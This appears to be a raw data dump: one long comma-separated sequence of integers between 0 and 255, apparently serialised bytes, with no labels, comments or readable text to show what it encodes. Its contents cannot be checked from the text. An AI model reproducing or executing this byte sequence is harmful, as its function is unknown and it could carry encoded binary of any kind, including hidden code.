5,235,149,176,77,125,30,1,38,219,196,239,139,131,100,46,92,121,152,199,193,158,142,175,82,119,13,54,33,253,250,154,188,160,70,110,24,51,208,234,237,167,198,27,71,114,14,44,204,238,146,151,191,169,68,97,17,50,213,250,144,152,131,95,125,29,63,35,227,220,209,215,253,162,94,102,69,104,133,182,145,175,174,80,116,26,2,44,199,228,148,181,183,92,114,27,6,34,192,224,130,166,171,83,125,24,53,37,236,196,220,225,20,22,63,97,126,167,163,206,204,235,74,91,118,67,105,150,145,202,218,224,1,66,100,8,46,214,192,155,184,168,73,108,112,6,47,218,246,148,180,86,122,96,103,17,44,201,249,154,189,136,85,47,46,79,113,197,179,216,248,61,23,77,126,72,43,210,243,219,247,4,56,91,71,119,168,150,185,221,235,76,58,84,0,4,218,195,238,138,168,72,106,14,52,220,37,192,157,141,174,81,118,12,53,32,219,249,179,150,17,0,37,67,50,218,204,255,255,153,93,2,35,88,70,132,153,164,197,247,236,67,38,89,49,212,249,238,151,130,94,124,28,62,34,200,240,249,148,177,161,66,101,10,10,228,166,213,223,232,11,33,76,108,43,139,172,193,213,182,2,48,77,68,33,172,219,212,208,249,82,105,5,52,62,129,164,194,235,248,19,32,88,100,210,179,223,202,239,252,22,60,82,57,155,178,220,251,164,172,76,99,7,45,213,255,154,183,167,72,74,111,5,46,217,245,147,179,85,121,126,76,61,34,134,183,208,232,232,36,48,26,8,116,150,142,206,226,13,15,29,21,71,101,132,166,193,226,19,8,24,95,117,148,201,172,215,251,31,50,82,89,66,148,204,190,197,238,19,28,64,97,123,66,255,129,140,233,2,32,102,123,74,142,171,209,254,94,8,45,85,126,97,221,254,225,134,92,69,112,12,42,202,203,239,149,189,167,66,31,15,48,211,253,192,216,196,21,47,27,109,115,175,138,170,198,253,160,5,42,72,223,133,161,175,234,227,26,39,121,84,120,132,175,130,156,242,19,54,87,75,67,179,204,222,229,169,23,50,22,51,35,196,231,140,129,170,85,113,15,47,209,245,155,131,166,138,77,58,90,113,137,186,207,200,242,174,16,48,78,44,216,176,214,255,242,239,26,33,116,35,146,182,221,186,17,19,40,49,70,100,128,182,213,181,243,25,55,61,112,110,145,164,239,175,74,65,41,93,81,104,128,129,200,196,15,36,61,80,54,150,129,171,221,225,74,122,122,29,2,216,193,236,136,166,70,104,12,17,57,35,212,182,197,233,7,32,10,27,63,141,164,210,235,24,23,37,124,71,111,137,178,148,135,83,0,35,66,97,75,158,189,198,245,192,5,80,71,73,43,156,174,218,128,24,52,91,60,34,119,136,161,192,234,44,63,45,65,145,164,211,237,150,182,77,52,90,126,71,202,138,178,222,180,29,33,89,3,214,183,190,209,138,236,25,54,84,68,113,138,232,185,204,224,0,5,67,124,145,146,154,167,194,166,67,115,20,55,220,242,155,229,129,95,127,75,40,100,151,253,145,188,140,235,13,63,71,96,158,187,242,229,247,49,102,54,75,103,143,183,195,244,241,23,117,59,86,107,131,180,193,174,24,22,122,93,69,103,203,252,249,175,8,26,53,19,53,217,255,231,145,172,73,114,84,54,44,198,205,235,154,165,17,52,35,116,115,97,188,216,198,231,15,53,104,93,125,155,185,218,184,92,66,106,115,14,43,219,214,178,200,19,13,110,23,7,105,128,162,240,240,230,1,95,65,65,113,147,235,216,254,24,54,85,59,62,36,204,246,145,174,94,85,79,66,154,112,152,226,194,254,13,61,22,35,40,118,172,166,244,231,11,43,85,2,146,154,184,210,205,167,79,121,20,49,33,194,196,195,146,168,83,111,13,45,207,243,248,202,167,172,64,38,65,119,171,165,182,171,242,26,55,47,74,107,159,169,255,145,139,224,11,37,74,72,130,161,194,198,215,17,53,42,107,50,151,176,194,219,252,1,61,47,96,47,133,177,210,224,180,26,55,87,6,117,143,187,198,239,234,21,58,113,58,156,172,179,221,171,227,25,57,27,68,132,170,167,134,185,68,21,59,103,115,115,169,212,137,230,12,18,40,92,59,215,245,149,183,91,65,72,88,32,102,147,181,158,209,22,66,100,96,84,99,154,169,214,232,241,18,88,37,69,105,212,174,221,255,90,53,74,88,91,108,159,160,241,249,15,63,44,117,53,99,134,173,199,230,40,34,71,124,96,33,227,238,203,224,2,32,22,77,125,153,181,208,128,166,78,120,19,48,32,32,233,197,242,238,28,110,17,44,128,152,184,220,137,232,0,50,93,121,218,207,248,227,191,93,125,31,41,4,251,214,177,220,199,163,3,62,79,99,129,191,161,205,176,26,63,42,88,39,148,166,188,151,232,29,53,102,68,105,192,226,134,139,179,93,120,21,47,11,192,236,208,222,246,35,37,94,124,165,185,172,192,199,231,27,34,114,61,221,186,165,204,235,193,16,59,92,127,70,191,214,193,207,177,2,39,71,121,214,233,148,230,8,23,71,61,77,106,150,182,157,130,88,65,75,103,5,37,237,198,187,148,231,48,63,106,78,123,157,160,198,243,22,52,118,86,121,106,158,244,221,237,20,62,96,48,117,109,206,172,193,168,74,110,20,27,5,32,253,199,163,227,19,56,86,94,105,152,177,248,177,247,8,46,83,99,78,147,131,164,242,202,81,112,11,121,109,152,181,158,196,226,3,63,93,52,56,206,247,226,190,92,124,52,47,2,253,157,186,212,129,162,69,106,0,41,212,207,199,160,234,6,55,40,95,104,140,145,243,150,187,81,122,101,1,223,255,225,228,138,152,113,126,1,10,53,192,185,171,202,225,92,59,67,115,130,252,228,237,136,165,85,118,25,62,212,253,232,174,172,228,22,53,89,53,194,250,195,212,213,227,9,101,14,57,213,243,147,181,184,94,70,112,11,2,245,183,217,201,3,95,24,35,74,109,135,190,222,247,225,92,45,38,68,45,148,161,145,188,88,85,117,23,59,33,227,222,135,163,9,57,48,42,120,118,131,166,228,233,0,34,17,94,74,150,186,226,222,252,28,63,6,83,104,153,158,154,163,164,30,51,95,68,124,138,143,169,255,165,28,45,73,70,103,207,245,157,135,162,127,111,16,56,26,231,219,165,243,30,123,29,1,39,46,216,243,144,170,140,1,60,113,97,102,128,163,207,174,82,120,96,10,37,33,209,242,149,186,80,83,73,9,207,246,171,170,200,230,85,61,64,66,112,199,203,225,138,181,81,111,15,49,213,251,194,198,170,173,92,59,87,116,135,191,134,175,210,225,36,50,95,123,174,188,218,161,200,232,6,100,13,56,212,242,146,147,183,93,69,111,10,13,250,182,222,200,225,94,26,43,74,108,166,177,206,218,142,28,49,46,71,99,178,170,194,250,208,84,105,8,58,115,134,187,194,233,90,28,52,98,56,33,204,232,134,166,72,97,92,51,46,244,214,193,161,235,26,12,114,29,57,215,247,153,189,163,97,88,42,89,114,148,148,171,244,231,79,107,104,8,42,206,244,156,134,161,126,110,68,60,63,217,251,240,180,14,51,93,87,11,102,132,179,219,191,160,67,104,62,6,49,205,235,139,173,81,93,50,76,86,114,132,241,137,185,27,43,49,118,155,220,254,226,136,176,90,117,18,2,35,37,202,202,164,250,21,38,90,48,221,209,132,189,207,239,50,39,94,50,129,183,140,181,202,18,19,36,109,51,137,183,186,228,195,225,77,99,12,55,211,241,240,146,156,113,110,67,77,104,147,247,154,158,180,93,72,100,2,8,233,173,219,219,246,14,57,40,75,43,208,230,143,153,181,83,115,21,57,223,199,219,161,160,173,87,108,105,99,105,138,176,139,238,245,11,36,24,2,221,250,234,139,174,178,72,113,28,56,252,219,221,233,240,30,83,115,11,111,143,173,173,252,163,78,73,103,7,41,205,243,155,133,160,125,102,64,94,112,131,160,159,171,89,100,7,30,13,46,147,188,199,202,93,74,34,72,80,114,133,184,222,248,49,34,91,0,24,143,155,162,147,252,0,54,98,55,57,158,176,168,243,173,81,49,69,84,67,109,155,203,220,210,27,40,106,53,98,140,146,234,193,236,19,115,70,111,131,217,130,169,190,94,64,100,10,50,220,214,217,206,141,165,24,48,74,70,128,138,162,216,193,31,13,56,71,87,215,254,188,209,250,20,36,55,82,115,138,129,168,218,247,63,108,35,68,107,159,182,166,202,251,5,114,9,56,142,146,162,139,203,246,27,52,44,54,223,202,230,132,131,165,73,69,58,69,146,188,233,138,140,177,71,112,27,55,255,216,158,255,239,237,82,109,10,58,219,254,227,185,162,172,72,102,44,5,197,183,207,214,11,83,28,35,97,122,159,148,220,251,10,31,121,29,3,43,213,240,141,189,94,65,69,27,4,47,203,233,163,134,70,125,50,41,72,138,141,161,199,241,69,58,45,93,121,138,252,224,134,174,88,115,16,31,0,35,200,158,173,159,0,41,68,89,49,213,173,172,214,228,21,32,64,87,45,216,222,193,189,84,119,38,69,126,72,140,159,182,198,225,75,37,68,116,48,199,171,197,230,14,66,113,26,36,153,134,182,250,246,18,43,44,85,71,128,132,185,244,242,12,32,4,8,110,135,133,162,216,208,28,35,82,81,221,151,160,233,202,255,25,122,2,40,222,132,183,163,228,224,1,3,88,85,188,186,169,186,236,255,18,58,123,56,147,189,208,244,240,196,28,62,72,95,210,253,164,241,128,171,71,101,5,39,203,241,179,174,151,119,14,37,75,51,201,242,157,185,87,86,120,54,47,110,154,170,140,188,93,95,68,26,3,46,202,232,136,170,100,126,114,54,85,137,140,186,194,182,66,123,127,25,57,195,168,202,209,236,3,1,108,22,107,122,130,233,210,244,62,113,38,73,114,151,146,187,214,244,17,37,103,85,124,150,132,158,188,92,126,98,8,15,57,212,241,225,130,165,74,96,9,57,2,158,184,219,242,13,18,107,27,35,97,134,162,218,229,41,75,50,107,158,116,183,167,192,253,17,116,100,5,40,44,194,235,150,178,80,112,18,54,220,196,205,194,168,251,19,49,74,52,142,157,151,160,213,240,71,112,75,63,137,162,146,166,222,220,75,61,77,116,135,128,216,202,255,224,80,47,70,121,217,176,164,212,254,198,21,49,80,103,158,131,213,179,253,31,73,44,68,50,200,241,156,184,181,85,119,27,1,41,211,196,166,255,245,27,67,27,70,104,129,164,198,236,222,82,41,42,118,147,175,237,200,244,38,81,126,7,56,139,175,202,197,248,5,80,35,88,118,117,198,207,203,249,3,42,49,74,66,219,186,174,196,17,0,19,63,69,108,176,193,128,165,91,46,47,47,65,123,211,182,169,129,164,73,31,103,18,46,204,236,142,178,88,106,71,7,69,112,151,145,149,247,23,13,52,119,124,168,193,233,195,244,86,113,36,74,79,102,147,171,243,179,79,43,95,116,219,43,196,162,210,253,25,25,78,122,210,117,142,169,212,215,11,62,85,88,217,200,197,181,220,250,5,57,75,52,158,179,176,216,241,165,79,106,7,55,216,251,255,149,190,169,69,73,46,37,201,239,246,224,187,88,72,105,12,49,199,218,182,210,250,17,118,19,9,108,151,160,216,216,220,14,6,86,84,99,186,232,213,211,234,5,10,46,108,154,141,228,200,250,224,0,41,74,120,131,249,147,141,171,182,79,118,88,120,109,151,218,226,175,249,12,38,95,97,166,254,238,213,6,11,58,37,83,95,207,140,217,248,27,16,44,33,67,98,157,157,210,210,226,14,125,40,84,101,159,235,193,244,21,62,5,48,68,126,132,187,235,226,10,2,89,28,122,151,194,232,144,186,85,114,98,98,5,42,192,233,190,157,10,32,85,52,48,40,131,182,192,187,19,57,85,96,110,118,142,203,191,175,75,107,17,61,45,134,145,170,224,173,76,108,68,125,152,159,145,150,178,240,29,12,4,62,131,129,187,224,233,237,55,120,78,97,138,140,153,247,202,52,10,58,74,118,198,161,188,221,231,83,57,92,125,102,189,132,152,251,244,14,0,81,0,109,142,229,228,134,170,80,120,98,61,218,202,235,142,184,133,21,50,93,54,223,241,216,199,218,227,15,39,94,52,154,137,211,247,192,251,6,1,93,108,158,169,170,198,93,162,67,112,23,43,206,187,222,234,9,27,50,1,12,115,156,167,234,189,170,242,36,32,100,120,143,153,150,252,19,60,6,14,122,98,153,135,213,252,22,4,125,85,126,149,149,231,195,252,22,48,44,36,73,96,139,165,193,238,11,109,73,91,56,32,202,229,130,178,83,118,27,16,57,36,234,179,250,238,1,106,27,18,101,157,138,171,228,224,3,63,89,70,33,156,165,212,239,208,0,58,68,115,61,159,179,218,238,243,16,46,85,35,40,194,244,156,185,76,2,34,94,108,128,129,180,219,209,82,39,86,119,105,179,200,239,195,224,30,52,66,122,89,220,143,166,199,232,35,36,47,117,150,170,167,190,208,225,80,53,82,125,129,247,215,165,202,243,33,57,84,114,145,160,212,179,205,238,70,32,65,44,210,250,228,191,187,171,76,111,20,42,211,212,183,184,183,89,125,99,11,53,208,237,157,190,128,143,86,32,65,110,201,224,155,191,67,79,70,107,62,39,139,183,196,253,23,236,57,26,53,220,147,168,199,247,48,3,62,52,76,92,240,180,198,239,24,31,32,67,118,153,193,236,211,254,29,57,63,1,112,119,190,208,189,66,67,33,32,89,53,156,135,171,210,171,81,106,11,16,106,139,163,196,251,238,9,103,66,90,52,215,252,146,187,166,66,96,0,1,37,203,217,176,168,85,88,102,65,126,96,204,187,210,242,30,63,23,61,37,46,201,230,150,183,90,127,21,62,3,9,135,175,205,220,26,36,33,111,171,198,155,191,209,242,60,55,68,117,146,246,244,159,142,185,7,42,86,118,158,204,164,175,139,186,69,33,66,120,129,184,175,216,186,230,10,45,92,101,210,253,153,150,182,88,124,98,10,52,207,236,182,177,241,225,50,55,14,58,200,246,138,235,254,18,49,52,111,108,154,130,152,255,224,30,47,106,116,137,190,163,141,241,248,78,126,31,2,39,253,230,145,135,102,96,65,67,120,151,135,160,128,173,81,7,54,91,120,65,176,213,243,61,22,20,46,117,58,130,149,163,209,217,13,59,50,73,45,205,239,147,185,161,75,102,72,63,119,152,190,145,186,165,65,31,30,0,36,224,223,141,183,95,68,33,77,65,112,138,144,193,244,30,39,89,78,13,126,156,164,193,197,20,44,85,123,7,62,193,165,198,234,31,52,121,105,147,104,146,165,253,171,29,45,84,103,160,153,170,223,192,176,75,104,24,57,220,32,246,159,138,166,68,78,43,100,149,176,149,156,169,169,84,109,70,102,132,179,148,219,252,24,24,53,90,114,162,229,169,207,255,247,10,47,95,104,129,231,205,194,243,90,84,31,33,49,205,163,219,195,252,29,122,94,113,159,173,168,201,149,176,77,125,30,1,38,252,207,189,165,253,7,62,64,86,147,142,173,220,251,252,19,27,3,101,117,188,207,200,16,242,7,40,24,62,208,147,175,205,230,60,79,114,5,44,159,160,219,247,195,6,5,53,94,70,219,169,196,248,240,51,48,79,126,101,201,236,155,229,29,10,43,5,71,96,158,186,229,161,28,37,84,78,113,97,149,165,210,181,88,125,19,27,6,34,192,224,130,166,76,94,51,119,112,109,146,233,218,234,24,55,119,124,120,156,148,201,214,238,38,105,68,108,123,139,134,211,219,228,5,99,27,41,156,152,137,212,251,168,15,37,17,39,208,218,246,148,180,86,80,77,34,31,196,141,183,223,189,162,120,97,12,40,198,230,205,166,161,89,17,81,59,34,152,183,182,253,188,14,55,94,120,186,243,173,165,215,198,66,57,80,65,119,157,189,204,196,237,26,56,91,87,210,136,168,241,238,160,3,51,66,124,97,168,212,245,216,81,22,42,86,80,129,182,175,224,166,24,11,48,106,37,162,152,246,249,22,233,46,110,89,100,179,171,202,225,226,18,12,18,108,103,145,177,214,197,30,3,1,42,102,40,155,177,210,227,27,62,60,77,1,54,198,176,221,253,24,63,113,26,5,33,255,159,129,165,75,115,29,23,30,9,204,224,195,236,5,35,80,94,101,148,254,208,200,239,10,54,22,22,57,222,244,157,136,164,104,79,20,40,48,213,172,212,254,232,11,107,92,103,109,150,185,147,179,85,121,31,7,49,43,226,213,153,188,161,119,96,11,39,197,238,203,131,165,72,76,13,50,126,130,140,165,134,250,15,57,66,54,216,252,193,233,147,174,75,81,49,112,96,250,167,168,197,229,6,39,104,126,137,132,134,211,216,248,49,123,76,125,153,181,214,251,247,12,5,10,22,116,130,183,215,213,134,92,69,112,38,7,224,193,153,242,243,226,66,31,15,48,249,213,202,249,196,93,123,27,61,33,199,239,153,158,124,169,73,52,64,147,139,188,225,249,8,29,124,75,76,99,145,151,223,225,23,60,112,25,4,32,254,158,128,164,74,114,123,22,25,14,138,162,196,246,75,50,52,67,109,144,187,254,206,255,9,3,59,65,109,188,253,219,206,229,15,46,96,75,126,149,152,153,242,232,6,106,74,82,100,140,183,243,246,21,61,76,78,123,103,149,182,222,187,230,63,31,10,38,35,195,229,137,175,125,108,21,49,103,102,133,165,196,254,14,49,29,97,148,159,142,166,221,206,80,62,94,110,115,188,149,159,134,175,68,45,79,123,140,150,187,232,197,249,61,118,2,118,157,179,161,197,252,46,23,46,114,42,136,176,223,167,133,70,68,33,68,96,157,168,202,218,242,233,34,78,71,99,145,184,195,149,128,92,122,48,17,100,136,171,152,255,230,17,64,126,8,144,136,187,218,239,238,3,63,88,92,121,141,173,210,253,250,89,116,17,11,139,190,216,241,237,6,19,41,92,86,56,141,169,194,245,9,17,62,64,97,179,164,211,206,239,8,13,115,90,114,148,166,155,200,237,9,52,34,64,101,157,178,251,229,236,10,42,34,77,44,145,186,145,177,83,119,55,73,36,4,207,178,217,255,95,117,30,9,46,15,134,170,205,174,86,64,27,56,7,40,203,218,171,166,82,38,93,120,118,150,145,179,212,255,71,42,86,116,118,162,141,185,198,195,69,103,11,49,217,34,253,154,138,171,78,115,35,31,153,150,179,150,184,92,66,106,20,47,204,252,252,159,132,112,110,103,78,102,141,234,237,147,187,165,64,29,13,46,209,246,235,148,191,91,121,51,22,214,213,237,155,129,174,82,111,106,80,152,136,255,158,216,229,24,51,83,72,40,222,224,201,196,250,27,33,91,71,168,174,221,242,247,224,1,24,77,125,99,143,160,217,243,201,93,63,95,101,207,243,153,129,171,165,66,114,19,54,219,241,154,133,161,127,126,96,4,42,248,209,158,164,164,73,87,108,14,59,222,165,213,254,92,101,41,44,89,107,128,131,150,164,94,45,73,46,64,110,141,166,241,255,20,58,84,95,106,126,134,173,200,235,10,38,114,28,100,138,182,230,144,171,72,120,25,60,0,214,255,234,134,164,68,102,10,48,55,33,252,179,164,163,69,60,71,120,111,148,187,192,241,83,13,37,82,109,155,218,251,158,131,89,66,109,9,39,199,200,236,146,186,164,127,54,33,36,192,212,230,131,190,86,104,16,109,155,138,226,230,194,226,9,61,36,112,220,216,240,178,221,224,8,32,89,120,81,204,207,188,199,178,87,109,22,1,221,251,155,189,128,166,78,120,19,48,32,235,201,199,251,239,6,110,92,126,134,242,222,201,137,164,65,113,18,53,218,240,153,132,160,93,87,50,10,33,161,137,254,231,230,228,70,118,1,122,135,185,143,227,16,23,53,46,12,39,196,244,149,184,93,115,123,102,2,32,234,207,200,233,28,42,120,81,64,106,139,175,202,200,21,38,48,119,124,131,168,132,129,237,14,49,86,85,92,152,172,168,227,163,7,43,72,14,115,118,178,204,203,200,8,48,66,93,114,162,185,198,247,28,64,46,91,45,41,217,250,157,130,88,65,70,37,47,45,137,164,216,237,224,48,78,77,36,122,144,172,220,243,22,20,13,109,156,134,136,160,221,237,25,21,110,12,217,129,141,163,222,250,15,29,90,105,84,195,245,168,205,248,0,62,80,115,136,191,253,129,250,232,12,48,18,50,223,142,172,174,233,229,20,35,69,100,174,189,219,223,238,234,20,62,80,52,217,239,152,169,147,24,50,91,2,100,153,180,149,175,129,236,10,35,84,106,145,190,192,225,204,31,53,32,109,111,151,189,213,183,71,88,114,49,66,154,177,175,202,232,0,21,19,14,74,106,129,185,192,233,25,28,63,115,126,154,189,130,199,253,8,55,118,87,123,156,169,232,202,237,11,48,36,72,123,145,181,244,203,228,10,22,44,90,119,148,243,213,252,89,127,103,17,33,5,242,212,137,129,74,64,63,66,87,98,128,165,144,244,227,62,85,70,10,45,210,232,187,145,29,35,68,108,220,60,201,167,221,249,18,58,31,72,155,97,130,165,135,167,73,109,57,22,96,138,174,184,141,173,85,37,85,124,219,181,185,217,241,232,76,118,17,46,244,210,193,230,188,165,122,65,79,127,158,164,245,128,135,231,41,38,68,112,185,170,214,164,239,19,15,80,83,102,137,249,148,144,128,139,105,45,113,109,211,161,223,217,250,23,42,96,68,96,138,166,147,243,236,25,45,39,97,154,191,165,214,226,197,22,36,82,69,36,129,165,130,171,181,81,69,34,56,221,182,177,204,206,11,1,39,24,115,156,181,179,192,239,20,4,76,33,30,243,189,216,195,141,103,2,45,67,56,154,160,199,224,29,44,102,111,10,39,253,213,223,206,19,127,106,101,3,9,232,173,193,242,161,124,25,104,9,44,209,231,186,150,19,59,80,55,104,101,134,187,204,254,20,52,93,3,118,115,153,188,195,244,72,34,87,114,87,222,169,174,194,230,21,62,93,113,153,215,177,208,189,163,75,117,16,45,221,221,192,229,187,164,101,70,0,43,153,139,186,213,199,245,48,33,108,124,158,162,150,226,180,30,54,85,72,69,154,171,160,198,217,228,13,33,88,61,152,172,164,139,176,81,37,90,71,109,128,165,220,219,250,79,52,34,124,146,177,159,131,136,176,90,117,18,2,35,198,235,129,163,153,30,43,70,100,212,243,224,192,226,231,28,25,21,52,179,168,143,152,234,29,14,101,77,122,221,248,149,133,166,168,77,99,38,26,156,181,145,186,94,117,10,43,91,98,154,190,210,220,1,59,47,126,71,97,133,184,221,253,242,52,32,111,91,121,153,167,223,243,86,58,93,21,115,157,136,241,128,214,89,40,82,39,55,32,203,231,175,136,78,99,67,93,76,148,187,190,197,225,48,39,91,114,91,146,184,209,250,172,25,56,70,120,78,145,173,165,220,163,0,37,65,124,106,131,166,221,175,141,57,35,75,27,251,143,186,218,187,89,121,27,21,8,137,152,180,142,190,95,66,103,61,38,209,230,199,206,226,21,118,30,8,35,192,240,240,147,184,78,119,98,20,241,185,205,173,198,233,89,105,17,68,102,140,166,211,199,208,1,44,110,33,135,171,160,219,133,162,82,115,22,59,209,250,229,129,190,94,64,100,10,50,246,218,218,193,204,243,76,107,9,98,128,177,224,247,5,26,33,111,0,68,134,159,131,234,6,29,23,99,71,104,195,231,141,181,95,89,118,102,7,42,207,229,164,148,26,55,114,29,49,214,149,164,197,233,28,55,62,35,101,154,174,178,193,195,92,56,46,95,66,212,170,187,195,236,2,33,17,85,126,213,161,197,250,241,73,127,113,10,104,148,184,227,185,162,77,105,7,6,40,230,223,212,193,23,40,108,89,126,113,152,178,238,180,10,57,82,125,36,111,155,177,141,239,31,9,37,60,99,102,203,233,137,171,101,88,79,66,118,188,143,189,211,255,46,120,51,120,130,186,176,144,202,239,27,60,124,0,101,138,137,158,213,247,23,45,64,94,158,185,163,166,232,161,76,114,71,123,152,186,228,211,252,30,48,47,9,49,219,246,185,207,138,174,27,40,70,118,158,129,219,244,231,84,17,32,78,112,161,184,202,252,212,91,8,45,73,116,129,168,217,242,151,117,57,44,72,41,211,228,223,249,28,50,33,90,123,158,138,129,222,244,22,27,122,83,116,157,134,169,169,142,24,19,110,11,0,136,172,186,200,220,1,46,35,89,121,186,176,211,242,227,9,49,108,69,120,153,178,174,146,140,8,38,32,47,10,194,171,221,131,84,123,49,72,14,56,201,171,217,185,93,119,64,121,2,33,212,183,200,188,87,64,61,127,11,122,152,185,219,164,6,32,93,75,33,147,159,187,197,243,30,117,96,60,218,243,214,229,139,239,87,127,15,69,46,99,199,128,134,235,9,107,71,108,146,184,178,232,131,160,80,91,57,64,193,186,194,147,188,37,112,35,8,45,218,172,181,225,206,228,9,47,69,52,208,238,142,165,158,33,79,41,6,46,211,140,153,218,177,71,69,57,123,223,141,164,200,221,240,87,116,100,5,2,224,234,206,183,190,17,120,87,114,137,144,167,199,225,244,27,119,77,120,148,156,145,207,240,226,33,109,91,112,147,163,164,198,254,22,111,67,93,123,150,217,184,252,10,21,4,107,70,106,140,168,164,229,160,75,70,100,46,11,142,190,221,130,24,41,38,43,75,50,134,163,201,236,19,36,24,85,68,97,135,238,206,232,16,62,34,25,31,48,201,238,133,236,27,58,87,100,61,212,137,185,197,247,2,38,75,111,89,140,191,249,158,254,19,40,79,114,78,109,135,223,202,220,76,44,67,44,208,213,253,205,175,27,1,53,19,125,157,154,128,219,187,21,47,52,83,106,139,211,190,165,201,240,73,15,8,46,211,237,164,218,254,25,5,2,11,102,155,188,187,219,253,12,44,110,125,222,146,171,233,152,185,18,58,44,74,102,129,183,227,151,185,11,35,88,125,184,151,190,218,205,210,17,54,84,85,198,132,227,213,207,236,70,62,91,62,154,246,178,200,228,174,2,36,24,52,210,242,190,149,12,224,27,41,70,101,153,179,131,184,13,236,28,34,79,85,133,174,212,206,48,121,85,105,79,49,139,177,216,248,25,117,118,26,0,2,255,228,130,255,13,55,14,121,82,101,198,181,202,225,24,7,87,49,127,189,203,162,192,253,30,48,80,76,113,253,212,217,205,238,85,60,68,82,61,61,155,155,208,225,14,59,72,91,32,158,190,169,129,26,0,46,18,125,110,154,192,210,232,15,40,37,84,46,62,152,173,208,136,231,1,82,70,68,157,130,229,222,253,30,43,28,73,115,144,183,244,215,224,17,23,92,115,136,185,232,197,205,225,85,111,98,80,106,130,181,156,217,226,15,8,58,25,240,239,168,168,198,153,121,117,30,50,149,148,183,203,250,243,69,107,19,61,242,216,161,200,205,173,67,108,23,25,252,181,221,242,188,164,78,105,6,54,215,250,181,152,249,230,1,98,2,36,200,238,150,128,91,87,71,104,11,26,235,230,223,251,21,61,123,79,55,117,148,187,198,245,84,27,15,94,82,127,148,229,203,245,30,37,61,48,61,218,202,235,142,179,73,114,124,24,54,214,248,156,130,170,126,66,37,94,116,139,196,147,129,252,15,44,68,70,75,209,243,132,211,52,87,56,17,71,100,212,246,153,245,28,63,80,104,14,62,176,189,247,165,244,71,91,79,49,44,202,234,140,176,86,126,104,3,32,47,250,222,215,234,87,75,23,52,146,152,147,163,195,240,28,18,53,71,66,208,179,169,222,253,2,35,7,96,139,136,139,181,203,178,29,63,27,103,218,201,191,158,236,239,2,106,18,60,215,244,228,228,135,134,111,37,83,122,132,240,222,212,246,241,2,38,5,115,159,249,158,147,188,141,110,104,3,111,134,160,199,240,215,84,78,35,70,102,141,141,205,230,224,27,18,92,112,111,182,241,205,251,249,11,19,93,109,101,145,228,153,166,6,14,58,51,115,151,201,166,204,241,7,28,123,23,53,213,221,182,136,161,22,0,43,116,107,159,174,205,199,234,73,41,41,65,120,145,180,177,249,118,97,71,66,88,99,157,254,135,184,22,53,87,55,72,112,158,163,210,221,241,15,80,70,64,101,227,196,199,230,27,125,122,2,112,97,134,166,212,232,24,15,82,88,118,144,129,128,199,236,29,49,74,44,97,123,178,166,212,174,81,108,75,100,145,139,138,133,197,240,23,39,82,68,148,113,190,219,151,114,105,68,85,117,147,217,239,166,213,231,0,44,21,127,157,186,164,209,232,162,76,103,4,30,248,188,178,215,187,166,66,96,42,15,131,185,198,201,184,27,23,51,93,107,150,237,152,147,177,81,115,23,61,15,226,227,195,216,242,90,127,21,62,41,197,227,131,143,133,10,56,37,59,216,200,233,140,177,166,79,122,22,52,212,220,183,145,168,186,76,58,77,106,144,135,204,213,237,72,88,101,84,127,129,180,166,234,15,10,75,110,19,41,210,253,153,183,87,121,124,98,10,52,207,236,182,144,169,80,11,109,30,34,156,161,203,249,90,55,53,33,105,45,206,241,150,172,85,64,28,25,57,219,255,229,141,183,82,69,50,68,76,98,253,230,145,173,75,107,13,49,54,222,200,227,128,176,81,116,51,2,62,88,240,210,243,23,22,33,67,117,165,223,145,176,205,170,76,124,13,36,195,205,227,235,183,239,4,47,87,122,135,153,139,159,234,247,9,23,104,100,139,229,183,209,246,6,34,6,8,48,195,169,187,211,226,54,17,24,108,118,134,233,229,149,182,89,126,20,61,40,196,226,130,131,167,77,117,31,58,215,199,194,166,134,181,78,117,5,35,198,248,153,179,150,184,28,45,86,55,207,147,216,212,232,227,50,100,27,42,137,172,171,254,21,229,15,27,28,120,131,180,152,182,86,87,123,97,9,51,206,235,155,188,95,68,121,98,13,41,199,231,163,128,29,62,12,75,60,124,159,184,149,237,29,127,122,24,56,218,254,228,140,182,81,110,30,30,1,38,252,207,189,165,66,26,126,103,97,152,128,226,162,175,0,33,80,13,122,96,190,212,247,93,65,103,15,57,51,208,192,225,132,169,127,104,19,47,44,230,195,221,252,160,90,113,2,46,50,134,174,192,244,225,20,74,127,32,128,135,176,155,191,91,6,50,78,96,163,153,188,159,252,3,56,65,78,110,159,134,130,148,240,20,52,91,107,39,195,225,224,130,166,76,116,30,57,214,198,205,196,158,164,80,120,71,102,130,185,221,201,209,238,74,43,86,123,148,140,150,191,137,165,67,99,5,41,207,247,225,188,146,133,64,100,95,104,153,175,212,251,225,16,114,46,95,115,157,185,148,240,13,227,44,97,12,40,198,230,136,172,82,115,110,91,104,103,137,239,148,170,83,119,84,61,26,157,179,166,139,181,80,109,124,29,0,37,209,201,202,254,27,61,106,64,102,137,146,164,236,174,79,114,118,12,53,32,252,154,186,92,64,76,35,30,118,129,186,224,131,168,126,103,18,13,43,203,237,145,183,117,100,100,8,85,100,134,173,135,244,239,54,118,114,139,119,169,191,222,181,82,66,99,6,43,32,201,244,144,174,78,112,20,58,34,1,235,234,155,250,24,53,70,120,104,151,185,151,207,242,10,35,78,54,158,150,132,188,141,163,76,119,19,49,209,243,246,156,132,174,99,75,82,121,159,255,149,157,136,164,66,98,4,40,206,246,224,176,154,174,90,101,0,46,155,179,215,196,189,30,42,94,83,49,204,233,153,186,188,161,119,96,11,39,197,229,135,171,176,114,111,20,47,56,197,251,139,164,177,80,109,2,56,204,234,239,138,184,86,92,117,13,50,44,173,166,192,164,13,10,40,95,85,184,197,253,189,232,3,17,39,109,87,209,171,203,241,91,127,101,108,22,49,206,254,159,130,167,125,102,112,12,42,224,193,222,243,22,28,99,79,93,120,211,190,199,183,162,126,28,60,61,33,199,239,153,180,81,107,79,75,76,151,156,243,194,255,12,9,65,124,84,108,164,174,222,250,61,52,69,111,68,46,185,215,198,234,5,17,81,101,149,69,196,161,197,162,75,118,18,48,208,209,245,177,174,227,13,45,65,54,219,172,182,206,194,231,19,52,110,37,205,232,227,153,243,234,8,24,86,104,206,191,189,146,178,84,120,52,43,48,203,232,152,178,150,169,126,111,120,78,144,161,193,137,178,87,17,78,113,41,134,172,209,200,252,91,119,21,53,253,214,232,129,246,225,5,8,66,83,119,188,165,141,180,166,3,36,67,64,131,137,159,240,237,239,0,56,10,51,222,250,178,149,83,118,13,36,92,100,142,156,211,211,231,26,16,60,68,89,140,167,203,251,28,15,65,80,65,102,134,180,195,227,231,87,54,48,17,100,136,171,178,158,82,20,47,38,75,145,137,188,231,174,76,32,64,66,107,108,150,225,145,178,85,80,61,57,3,223,253,183,146,231,7,52,27,